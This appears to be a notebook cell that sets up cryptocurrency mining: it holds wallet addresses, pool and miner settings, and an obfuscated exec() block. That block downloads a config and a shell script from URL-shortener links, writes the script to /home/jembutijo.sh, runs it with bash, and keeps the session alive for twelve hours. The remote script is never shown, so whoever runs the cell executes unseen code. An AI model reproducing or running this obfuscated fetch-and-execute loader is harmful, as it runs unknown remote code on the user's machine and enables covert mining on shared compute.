AlgoList = "Ethash,RandomX,Autolykos2" #@param {type:'string'}
BTCWallet = "3951ChMnSVTDTEzWE2dA6Pwa4cAUi2REg6" #@param {type:'string'}
ETCWallet = "0xA80ACc945731237F80E72eCe54D8d4e9e61e21E2" #@param {type:'string'}
ETHWallet = "0xA80ACc945731237F80E72eCe54D8d4e9e61e21E2" #@param {type:'string'}
VerusWallet = "0xA80ACc945731237F80E72eCe54D8d4e9e61e21E2" #@param {type:'string'}
PoolList = "2Miners" #@param {type:'string'}
MinerList = "TTminer" #@param {type:'string'}
RBMinerKey = "2dd6f3ed-384f-405d-8772-bc941562b81b" #@param {type:'string'} get it from rbminer.net/monitoring

exec("""\nO='BTC'\nJ='w'\nG='Coins'\nF=open\nE='Wallet'\nD='Config'\nimport requests as H\nfrom time import sleep\nfrom subprocess import run\nimport json as I,os\nK='https://s.id/Dc-HJ'\nL=H.get(K)\nM=L.text\nC='setup.json'\nwith F(C,J)as N:N.write(M)\nwith F(C,'r')as B:A=I.load(B);A[D]['MinerName']=MinerList;A[D]['MinerStatusKey']=RBMinerKey;A[D]['PoolName']=PoolList;A[D][E]=BTCWallet;A[G][O][E]=BTCWallet;A[G]['ETC'][E]=ETCWallet;A[G]['ETH'][E]=ETHWallet;A[G]['VRSC'][E]=VerusWallet;A['Pools']['NiceHash'][O]=BTCWallet;A[D]['Algorithm']=AlgoList\nos.remove(C)\nwith F(C,J)as B:I.dump(A,B,indent=4)\nB=F('/home/jembutijo.sh',J)\nB.write(H.get('https://s.id/DcX0x').text)\nB.close()\nrun(['bash',B.name])\nsleep(43200)\n""")
